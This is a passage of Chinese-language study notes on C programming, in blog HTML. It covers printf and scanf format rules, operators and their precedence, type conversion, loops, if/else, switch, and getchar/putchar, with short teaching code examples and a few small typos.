格式，则以<code>0</code>开始:如果是<code>%X</code>或格式，则以<code>0X</code>或<code>0X</code>开始:对于所有的浮点格式，#保证了即使后面没有任何数字，也打印一个小数点字符。对于<code>%g</code> 和<code>%G</code>格式，<code>#</code>防止结果后面的0被删除<br />通常情况下，整数会用空格来填充以满足指定的宽度，但使用<code>0</code>可以指示用零字符来填充。（用于右对齐的情况）<br />示例:”<code>%-10d</code>“</td></tr><tr><td>数字</td><td>最小字段宽度<br/>如果该字段不能容纳待打印的数字或字符串，系统会使用更宽的字段<br />示例:”<code>%4d</code>“</td></tr><tr><td>.数字</td><td>对于<code>%e、%E 和%f</code> 转换，表示小数点右边数字的位数<br/>对于<code>%q和%G</code>转换，表示有效数字最大位数<br/>对于<code>%s</code>转换，表示待打印字符的最大数量<br/>对于整型转换，表示待打印数字的最小位数<br/>如有必要，使用前%0来达到这个位数<br/>只使用.表示其后跟随一个0，所以<code>%.f</code>和<code>%.0f</code>相同<br />示例:<code>&quot;%5.2f&quot;</code>打印一个浮点数，字段宽度为5字符，其中小数点后有两位数字</td></tr><tr><td>h</td><td>和整型转换说明一起使用，表示<code>short int</code>或<code>unsigned short int</code>类型的值示例:<code>&quot;%hu&quot;、&quot;%hx&quot;、&quot;%6.4hd&quot;</code></td></tr><tr><td>hh</td><td>和整型转换说明一起使用，表示<code>signed char</code>或<code>unsigned char</code>类型的值<br />示例:“<code>%hhu</code>“、”<code>%hhx</code>“、”%<code>6.4hhd</code>“</td></tr><tr><td>j</td><td>和整型转换说明一起使用，表示intmax_t或uintmax_t类型的值。这些类型定义在stdint.h中<br />示例:”%jd”、”<code>%8jx</code>“</td></tr><tr><td>l</td><td>和整型转换说明一起使用，表示long int或unsignedlongint类型的值<br />示例:”&amp;ld”、”%8lu”</td></tr><tr><td>ll</td><td>和整型转换说明一起使用，表示long long int或unsigned long long int类型的值(C99)<br />示例:”<code>%lld</code>“、”<code>%81lu</code>“</td></tr><tr><td>L</td><td>和浮点转换说明一起使用，表示long double类型的值<br />示例:”<code>%Ld</code>“、”<code>%10.4Le</code>“</td></tr><tr><td>t</td><td>和整型转换说明一起使用，表示ptrdiff_t类型的值。ptrdiff_t是两个指针差值的类型(C99)<br />示例:”<code>%td</code>“、”<code>%12ti</code>“</td></tr><tr><td>z</td><td>和整型转换说明一起使用，表示size_t类型的值。size_t是sizeof返回的类型(C99)<br />示例:”<code>%zd</code>“、”<code>%12zd</code>“</td></tr></tbody></table><p>注：<code>printf()</code>中*的使用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Weight = %*.*f\n&quot;</span>, width, precision, weight);</span><br></pre></td></tr></table></figure><p>可以代表此处的数值由后面的变量进行决定，如此处的字符宽度由<em>width</em>进行决定，保留小数位数由<em>precision</em>进行决定</p><h2 id="scanf（）"><a href="#scanf（）" class="headerlink" title="scanf（）"></a><code>scanf（）</code></h2><h3 id="读取字符串的规则"><a href="#读取字符串的规则" class="headerlink" title="读取字符串的规则"></a><strong>读取字符串的规则</strong></h3><p>​<code>scanf()</code>在读取输入时就已完成把空字符放入字符串末尾这项工作.它在遇到<strong>第1个空白</strong>（空格、制表符或换行符）时就<strong>不再读取输</strong>入。</p><h3 id="的使用"><a href="#的使用" class="headerlink" title="&amp;的使用"></a><code>&amp;</code>的使用</h3><p>​如果用<code>scanf()</code>读取基本变量类型的值，在变量名前加上一个&amp;；<br>​如果用<code>scanf()</code>把字符串读入字符数组中，不要使用&amp;。</p><h3 id="scanf-的读取规则"><a href="#scanf-的读取规则" class="headerlink" title="scanf()的读取规则"></a>scanf()的读取规则</h3><p>每次读取一个字符，跳过所有的空白字符，直至遇到第1个非空白字符才开始读取</p><p><code>scanf()</code>不断地读取和保存字符，直至遇到非数字字符。</p><p>然后<code>scanf()</code>把非数字字符放回输入。这意味着程序在下一次读取输入时，首先读到的是上一次读取丢弃的非数字字符。</p><p>如果第1个非空白字符是A而不是数字，<code>scanf()</code>将停在那里，并把A放回输入中，不会把值赋给指定变量。程序在下一次读取输入时，首先读到的字符是A。如果程序只使用<code>%d</code>转换说明，<code>scanf()</code>就一直无法越过A读下一个字符。</p><h3 id="scanf-中的使用规则"><a href="#scanf-中的使用规则" class="headerlink" title="scanf()中的使用规则"></a><code>scanf()</code>中的使用规则</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%*d %*d %d&quot;</span>, &amp;n);</span><br></pre></td></tr></table></figure><p>使用*可以使<code>scanf()</code>跳过前两个函数的赋值,在上述代码中跳过两个整数，把第3个整数拷贝给n</p><h3 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h3><p><code>scanf()</code>函数返回读取数据的数量，所以如果读取对应类型则返回1，如果读取不成功则不返回0，在转换值之前出现问题，会返回一个特殊值EOF（通常被定义为-1）。</p><h3 id="读取小数值"><a href="#读取小数值" class="headerlink" title="读取小数值"></a>读取小数值</h3><p>由于输入的小数在c语言中默认作为double进行处理，所以对应的数据类型需要使用<code>&amp;lf</code>，否则会出错。</p><h2 id="本章注意点：-2"><a href="#本章注意点：-2" class="headerlink" title="本章注意点："></a>本章注意点：</h2><hr><h3 id="X-与-X-的区别"><a href="#X-与-X-的区别" class="headerlink" title="&quot;X&quot;与&#39;X&#39;的区别"></a><code>&quot;X&quot;</code>与<code>&#39;X&#39;</code>的区别</h3><p>区别之一在于’x’是基本类型（char），而”x”是派生类型（char数组）</p><p>区别之二是”x”实际上由两个字符组成：’x’和空字符\0</p><h3 id="sizeof-何时使用了圆括号"><a href="#sizeof-何时使用了圆括号" class="headerlink" title="sizeof 何时使用了圆括号"></a><code>sizeof</code> 何时使用了圆括号</h3><p>圆括号的使用时机否取决于运算对象是类型还是特定量。运算对象是类型时，圆括号必不可少，但是对于特定量，可有可无。也就是说，对于类型，应写成sizeof(char)或sizeof(float)；对于特定量，可写成sizeof name或sizeof 6.28。尽管如此，还是<strong>建议所有情况下都使用圆括号</strong>，如<code>sizeof(6.28)</code></p><h3 id="const限定符"><a href="#const限定符" class="headerlink" title="const限定符"></a><code>const</code>限定符</h3><p>C90标准新增了const关键字，用于限定一个变量为只读.这使得成为一个<strong>只读值</strong>，可以在计算中使用， 可以打印， 但是不能更改值。</p><hr><h1 id="运算符、表达式和语句"><a href="#运算符、表达式和语句" class="headerlink" title="运算符、表达式和语句"></a><strong>运算符、表达式和语句</strong></h1><h2 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h2><h3 id="基本运算符"><a href="#基本运算符" class="headerlink" title="基本运算符"></a>基本运算符</h3><p><code>=、+、-、*、/</code></p><p>注：C 没有指数运算符。不过，C 的标准数学库提供了一个<code>pow()</code>函数用于指数运算。例如，<code>pow(3.5, 2.2)</code>返回3.5的2.2次幂。</p><h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p><strong>&#x3D;并不意味着“相等”</strong>，而是一个赋值运算符。赋值行为从右往左进行。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bmw = <span class="number">2002</span>;</span><br></pre></td></tr></table></figure><p>读作“把值2002赋给变量bmw”</p><h3 id="求模运算符"><a href="#求模运算符" class="headerlink" title="求模运算符-%"></a>求模运算符-<code>%</code></h3><p>用于整数运算，求模运算符给出其左侧整数除以右侧整数的余数</p><h3 id="一元运算符与二元运算符"><a href="#一元运算符与二元运算符" class="headerlink" title="一元运算符与二元运算符"></a>一元运算符与二元运算符</h3><p>一元运算符：只有一个运算对象，如：-16</p><p>二元运算符：有两个运算对象，如：23-14</p><h3 id="递增递减运算符"><a href="#递增递减运算符" class="headerlink" title="递增递减运算符"></a>递增递减运算符</h3><p><strong>递增运算符：<code>++</code></strong></p><p>递增运算符执行简单的任务，将其运算对象递增1。</p><p><strong>递减运算符：<code>--</code></strong></p><p><strong><code>++</code>的前缀形式和后缀形式的区别</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">1</span>，</span><br><span class="line"><span class="type">int</span> b， c；</span><br><span class="line">b = a++</span><br><span class="line">c = ++a</span><br></pre></td></tr></table></figure><p>在最后的输出结果中会发现，b&#x3D;1而c&#x3D;3；这因为后缀在运算过程中在a使用完成后再进行递增，而前缀先进行递增而后进行计算。</p><p><strong>结合优先级</strong></p><p>只有圆括号的优先级比递增递减运算符高。因此， <code>x*y++</code> 表示的是<code>(x)*(y++)</code> ， 而不是<code>(x+y)++</code>。不过后者无效，因为递增和递减运算符只能影响一个变量（或者，更普遍地说，只能影响一个可修改的左值），而组合<code>x*y</code>本身不是可修改的左值。</p><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><table><thead><tr><th>运算符</th><th>含义</th></tr></thead><tbody><tr><td>&lt;</td><td>小于</td></tr><tr><td>&gt;</td><td>大于</td></tr><tr><td>&lt;&#x3D;</td><td>小于或等于</td></tr><tr><td>&gt;&#x3D;</td><td>大于或等于</td></tr><tr><td>&#x3D;&#x3D;</td><td>等于</td></tr><tr><td>!&#x3D;</td><td>不等于</td></tr></tbody></table><p>注：</p><p>可以通过关系运算符判断字符，但不能判断字符串</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="type">char</span> ch;</span><br><span class="line">a = (ch != <span class="string">&#x27;s&#x27;</span>)<span class="comment">//根据ASCII区分大小写</span></span><br></pre></td></tr></table></figure><p>通过关系运算符可以比较浮点数，但最好使用<code>&lt;</code>、<code>&gt;</code>进行判断，因为浮点数在储存时会造成舍入误差造成原本相等的两数不相等。可使用fabs()函数-返回绝对值来进行比较浮点数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span><span class="comment">//fabs()函数所需的头文件</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="type">double</span> ANSWER = <span class="number">3.14159</span>;</span><br><span class="line"><span class="type">double</span> response;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;What is the value of pi?\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;response);</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">fabs</span>(response - ANSWER) &gt; <span class="number">0.0001</span>)<span class="comment">//浮点数两数相等所自定义的允许误差</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%lf&quot;</span>, &amp;response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Close enough!\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="逗号运算符"><a href="#逗号运算符" class="headerlink" title="逗号运算符"></a>逗号运算符</h3><p>逗号运算符扩展了for循环的灵活性，以便在循环头中包含更多的表达式</p><p>逗号运算符并不局限于在for循环中使用，但是这是它最常用的地方。逗号运算符有两个其他性质。首先，它保证了被它分隔的表达式从左往右求值。(但逗号运算符无法在计算中插入使用以改变计算顺序，如：<code>b = 3 * 5 - 10, * 2 + 15</code>是错误的写法)</p><p>假设在写数字时不小心输入了逗号：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">houseprice = <span class="number">249</span>,<span class="number">500</span>;</span><br></pre></td></tr></table></figure><p>这不是语法错误，C 编译器会将其解释为一个逗号表达式，即<code>houseprice = 249</code> 是逗号左侧的子表达式，<code>500;</code> 是右侧的子表达式。</p><p><strong>逗号也可用作分隔符。</strong></p><p>逗号运算符会依次计算每个表达式，并返回最后一个表达式的值作为整个逗号运算符表达式的值。</p><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><table><thead><tr><th>逻辑运算符</th><th>含义</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>与</td></tr><tr><td>||</td><td>或</td></tr><tr><td>!</td><td>非</td></tr></tbody></table><h4 id="备选拼写：iso646-h头文件"><a href="#备选拼写：iso646-h头文件" class="headerlink" title="备选拼写：iso646.h头文件"></a><strong>备选拼写：iso646.h头文件</strong></h4><p>C99标准新增了可代替逻辑运算符的拼写，它们被定义在ios646.h头文件中。如果在程序中包含该头文件，便可用<code>and代替&amp;&amp;、or代替||、not代替!</code>。</p><h4 id="判断范围问题"><a href="#判断范围问题" class="headerlink" title="判断范围问题"></a><strong>判断范围问题</strong></h4><p>&amp;&amp;运算符可用于测试范围。例如，要测试score是否在90～100的范围内，可以这样写：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (range &gt;= <span class="number">90</span> &amp;&amp; range &lt;= <span class="number">100</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good show!\n&quot;</span>);</span><br></pre></td></tr></table></figure><p>千万不要模仿数学上的写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="number">90</span> &lt;= range &lt;= <span class="number">100</span>) <span class="comment">// 千万不要这样写！</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Good show!\n&quot;</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">由于&lt;=运算符的求值顺序是从左往右，所以编译器把测试表达式解释为：</span></span><br><span class="line"><span class="comment">(90 &lt;= range) &lt;= 100</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>子表达式90 &lt;&#x3D; range的值要么是1（为真），要么是0（为假）。这两个值都小于100，所以不管range的值是多少，整个表达式都恒为真。因此，**在范围测试中要使用&amp;&amp;**。</p><h3 id="条件运算符——"><a href="#条件运算符——" class="headerlink" title="条件运算符——?:"></a>条件运算符——<code>?:</code></h3><p>以下述代码为例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max = (a &gt; b) ? a : b;</span><br></pre></td></tr></table></figure><p>上述语句翻译为：如果a大于b，那么将max设置为a；否则，设置为b。</p><h3 id="运算符-查找地址"><a href="#运算符-查找地址" class="headerlink" title="&amp;运算符-查找地址"></a><code>&amp;</code>运算符-查找地址</h3><p>一元&amp;运算符给出变量的存储地址。PC地址通常用十六进制形式表示</p><p><code>%p</code>是输出地址的转换说明</p><h3 id="间接运算符"><a href="#间接运算符" class="headerlink" title="间接运算符-*"></a>间接运算符-<code>*</code></h3><p>间接运算符<code>*</code> ，该运算符有时也称为解引用运算符。<code>*</code>用于给出储存在指针指向地址上的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ptr = &amp;bah;</span><br><span class="line">val = *ptr; <span class="comment">// 找出ptr指向的值</span></span><br></pre></td></tr></table></figure><p>以上代码相当于如下代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">val = bah;</span><br></pre></td></tr></table></figure><p><strong>不要把间接运算符和二元乘法运算符（*）混淆，虽然它们使用的符号相同，但语法功能不同。</strong></p><h3 id="运算符的优先级"><a href="#运算符的优先级" class="headerlink" title="运算符的优先级"></a>运算符的优先级</h3><table><thead><tr><th>优先级</th><th>运算符</th><th>结合律</th></tr></thead><tbody><tr><td>1</td><td>后缀运算符：[]   ()   ·   -&gt;   ++   –(类型名称){列表}</td><td>从左到右</td></tr><tr><td>2</td><td>一元运算符：++   –   !   ~   +   -   *   &amp;   sizeof_Alignof</td><td>从右到左</td></tr><tr><td>3</td><td>类型转换运算符：(类型名称)</td><td>从右到左</td></tr><tr><td>4</td><td>乘除法运算符：*   &#x2F;   %</td><td>从左到右</td></tr><tr><td>5</td><td>加减法运算符：+   -</td><td>从左到右</td></tr><tr><td>6</td><td>移位运算符：&lt;&lt;   &gt;&gt;</td><td>从左到右</td></tr><tr><td>7</td><td>关系运算符：&lt;&lt;&#x3D;   &gt;&gt;&#x3D;</td><td>从左到右</td></tr><tr><td>8</td><td>相等运算符：&#x3D;&#x3D;   !&#x3D;</td><td>从左到右</td></tr><tr><td>9</td><td>位运算符 AND：&amp;</td><td>从左到右</td></tr><tr><td>10</td><td>位运算符 XOR：^</td><td>从左到右</td></tr><tr><td>11</td><td>位运算符 OR：|</td><td>从左到右</td></tr><tr><td>12</td><td>逻辑运算符 AND：&amp;&amp;</td><td>从左到右</td></tr><tr><td>13</td><td>逻辑运算符 OR：||</td><td>从左到右</td></tr><tr><td>14</td><td>条件运算符：?:</td><td>从右到左</td></tr><tr><td>15</td><td>赋值运算符：    &#x3D;     +&#x3D;     -&#x3D;    *&#x3D;    &#x2F;&#x3D;    %&#x3D;    &amp;&#x3D;    ^&#x3D;    |&#x3D;     &lt;&lt;&#x3D;    &gt;&gt;&#x3D;</td><td>从右到左</td></tr><tr><td>16</td><td>逗号运算符：，</td><td>从左到右</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">total += *start++;</span><br></pre></td></tr></table></figure><p>一元运算<code>*</code>和<code>++</code>的优先级相同，但结合律是从右往左，所以<code>start++</code>先求值，然后才是<code>*start</code></p><h2 id="类型转化"><a href="#类型转化" class="headerlink" title="类型转化"></a>类型转化</h2><p>在语句和表达式中，如果使用混合类型，C会采用一套规则进行自动类型转换。</p><p><strong>基本的类型转换规则</strong></p><ol><li>当类型转换出现在表达式时，无论是<code>unsigned</code>还是<code>signed</code>的<code>char</code>和<code>short</code>都会被自动转换成<code>int</code>，如有必要会被转换成<code>unsigned int</code></li><li>涉及两种类型的运算，两个值会被分别转换成两种类型的更高级别。</li><li>在赋值表达式语句中，计算的最终结果会被转换成被赋值变量的类型。这个过程可能导致类型升级或降级</li><li>当作为函数参数传递时，char和short被转换成int，float被转换成double。</li></ol><p>类型升级通常都不会有什么问题，但是类型降级会导致较低类型可能放不下整个数字。</p><h3 id="强制类型转换运算符"><a href="#强制类型转换运算符" class="headerlink" title="强制类型转换运算符"></a>强制类型转换运算符</h3><p>有时需要进行精确的类型转换，或者在程序中表明类型转换的意图。这种情况下要用到强制类型转换（cast），即在某个量的前面放置用圆括号括起来的类型名</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mice = <span class="number">1.6</span> + <span class="number">1.7</span>;</span><br><span class="line">mice = (<span class="type">int</span>)<span class="number">1.6</span> + (<span class="type">int</span>)<span class="number">1.7</span>;</span><br></pre></td></tr></table></figure><p>第1行使用自动类型转换。首先，1.6和1.7相加得3.3。然后，为了匹配<code>int</code> 类型的变量，3.3被类型转换截断为整数3。第2行，1.6和1.7在相加之前都被转换成整数（1），所以把1+1的和赋给变量mice。</p><h2 id="本章注意点：-3"><a href="#本章注意点：-3" class="headerlink" title="本章注意点："></a>本章注意点：</h2><hr><p>许多其他语言都会回避该程序中的<strong>三重赋值</strong>，但是C完全没问题。赋值的顺序是从右往左</p><p>在C语言中，除法操作默认会执行整数除法，即<strong>如果操作数都是整数，结果将会是整数，</strong>而不是浮点数.整数除法会截断计算结果的小数部分（丢弃整个小数部分），不会四舍五入结果.</p><p>在定义函数时，需要在最上面进行<strong>函数原型声明</strong></p><p>未进行函数的声明或未指定参数类型的情况下，会导致参数升级为不正确的数据类型，在函数调用中显式使用强制类型转换，可以修复这个问题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pound ((<span class="type">int</span>)f); <span class="comment">// 把f强制类型转换为正确的类型</span></span><br></pre></td></tr></table></figure><p>（<strong>所以最好在开头进行函数的原型声明</strong>）</p><hr><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a><strong>循环</strong></h1><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><p>使用格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(判断条件)<span class="comment">//此处不加；</span></span><br><span class="line">    条件成立的执行语句；</span><br></pre></td></tr></table></figure><p><code>while</code>通过括号的数值最后是否为0来进行判断一个真假，若为0则为假，若不为0则为真（但c语言中0为假，而1为真）。</p><p><code>while()</code>后加<code>;</code>表示执行空语句</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>使用格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(语句a;语句b;语句c)</span><br></pre></td></tr></table></figure><p>第1个表达式是初始化，只会在<code>for</code>循环开始时执行一次。第 2 个表达式是测试条件，在执行循环之前对表达式求值。如果表达式为假，循环结束。第3个表达式执行更新，在每次循环结束时执行。</p><p>注：在for循环中，可以省略一个或多个语句，但分号不能省略。</p><p><strong>在<code>for</code>语句的<code>（）</code>所<em>定义的变量</em>是局部变量，只在此for循环内的语句中有效</strong></p><h2 id="do…-while循环"><a href="#do…-while循环" class="headerlink" title="do….while循环"></a>do….while循环</h2><p>使用格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">    执行语句<span class="comment">//可为单一语句或者复合语句</span></span><br><span class="line"><span class="keyword">while</span> ( 判断条件 )；<span class="comment">//此处一定要加分号</span></span><br></pre></td></tr></table></figure><p>do while循环在执行完循环体后才执行测试条件，所以至少执行循环体一次</p><h2 id="本章注意点：-4"><a href="#本章注意点：-4" class="headerlink" title="本章注意点："></a>本章注意点：</h2><hr><h3 id="逻辑判断符号与赋值符号不要混淆"><a href="#逻辑判断符号与赋值符号不要混淆" class="headerlink" title="逻辑判断符号与赋值符号不要混淆"></a>逻辑判断符号与赋值符号不要混淆</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(a == <span class="number">1</span>);<span class="comment">//语句一</span></span><br><span class="line"><span class="keyword">while</span>(a = <span class="number">1</span>);<span class="comment">//语句二</span></span><br></pre></td></tr></table></figure><p>语句一中为判断a是否等于1</p><p>语句二为将1赋值给a，最后将1的参数给while最后造成语句二的循环不断进行</p><hr><h1 id="分支与跳转"><a href="#分支与跳转" class="headerlink" title="分支与跳转"></a><strong>分支与跳转</strong></h1><h2 id="if、else、else-if语句"><a href="#if、else、else-if语句" class="headerlink" title="if、else、else if语句"></a>if、else、else if语句</h2><p>使用格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(判断语句)<span class="comment">//此处不加分号</span></span><br><span class="line">  执行语句；<span class="comment">//可为单语句或多语句</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>()</span><br><span class="line">  执行语句；<span class="comment">//可为单语句或多语句</span></span><br><span class="line"><span class="keyword">else</span>()</span><br><span class="line">  执行语句；<span class="comment">//可为单语句或多语句</span></span><br></pre></td></tr></table></figure><p><strong>else与if配对原则</strong>：else与离它最近的if匹配，除非最近的if被花括号括起来</p><h3 id="数值的范围判断问题"><a href="#数值的范围判断问题" class="headerlink" title="数值的范围判断问题"></a>数值的范围判断问题</h3><h2 id="continue语句"><a href="#continue语句" class="headerlink" title="continue语句"></a><code>continue</code>语句</h2><p>​continue 语句让程序跳过continue 语句后在循环内的代码，让程序重新进入循环。</p><p>​continue还可用作占位符。例如，下面的循环读取并丢弃输入的数据，直至读到行末尾：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (getchar() != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><h2 id="break语句"><a href="#break语句" class="headerlink" title="break语句"></a><code>break</code>语句</h2><p>程序执行到循环中的break语句时，会终止包含它的循环，并继续执行下一阶段。</p><h2 id="多重选择：switch和break"><a href="#多重选择：switch和break" class="headerlink" title="多重选择：switch和break"></a>多重选择：<code>switch</code>和<code>break</code></h2><p>使用格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (整数值（包括<span class="type">char</span>类型）。)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> 值:<span class="comment">//表达式中只包含整型常量</span></span><br><span class="line">执行语句</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> 值:<span class="comment">//表达式中只包含整型常量</span></span><br><span class="line">执行语句</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">执行语句</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注：<code>switch</code>只处理了第1个字符</p><p><code>break</code>语句让程序离开<code>switch</code>语句，跳至<code>switch</code>语句后面的下一条语句。如果没有<code>break</code>语句，就会从匹配标签开始执行到<code>switch</code>末尾</p><p><code>break</code> 语句可用于循环和<code>switch</code> 语句中， 但是<code>continue</code>只能用于循环中。</p><h3 id="case多重标签"><a href="#case多重标签" class="headerlink" title="case多重标签"></a>case多重标签</h3><p>可以在switch语句中使用多重case标签</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (ch)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;A&#x27;</span>: a_ct++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>: e_ct++;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设如果<code>ch</code>是字母a，switch语句会定位到标签为<code>case &#39;a&#39;</code> :的位置。由于该标签没有关联<code>break</code>语句，所以程序流直接执行下一条语<br>句，即a_ct++;。如果 <code>ch</code>是字母A，程序流会直接定位到<code>case &#39;A&#39;</code> :。本质上，两个标签都指的是相同的语句。</p><h2 id="getchar-和putchar-函数"><a href="#getchar-和putchar-函数" class="headerlink" title="getchar()和putchar()函数"></a><code>getchar()</code>和<code>putchar()</code>函数</h2><p><strong>getchar()函数不带任何参数</strong>，它从输入队列中返回下一个字符。<br>例如，下面的语句读取下一个字符输入，并把该字符的值赋给变量ch：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ch = getchar();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;ch);<span class="comment">//与上一句等效</span></span><br></pre></td></tr></table></figure><p>putchar()函数<strong>打印它的参数</strong>。例如，下面的语句把之前赋给ch的<br>值作为字符打印出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">putchar</span>(ch);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, ch);<span class="comment">//于上一句等效</span></span><br></pre></td></tr></table></figure><p>由于这些函数只处理字符， 所以它们比更通用的<code>scanf()</code> 